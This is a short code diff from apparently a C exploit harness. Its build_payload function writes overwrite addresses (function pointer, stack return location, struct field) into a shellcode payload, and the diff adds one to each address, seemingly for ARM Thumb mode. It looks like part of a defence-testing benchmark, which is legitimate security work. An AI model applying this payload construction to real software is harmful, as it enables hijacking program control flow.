@@ -228,16 +228,16 @@ void build_payload(struct param_t *attack_params, char *payload, int *target_loc
     {
     case FUNCTION_POINTER:
         payload_address = (int *)payload;
-        *payload_address = (int)(fake_fun + FAKE_FUN_SVC_OFFSET);
+        *payload_address = (int)(fake_fun + FAKE_FUN_SVC_OFFSET + 1);
         break;
     case STACK:
         payload_address = (int *)(payload + SHELLCODE_LEN + PADDING_LEN);
-        *payload_address = (int)target_location;
+        *payload_address = (int)target_location + 1;
         // homebrew(payload + SHELLCODE_LEN + PADDING_LEN, &target_location, sizeof(char *));
         break;
     case STRUCT:
         payload_address = (int *)(payload + SHELLCODE_LEN);
-        *payload_address = (int)target_location;
+        *payload_address = (int)target_location + 1;
         break;
     default:
         break;
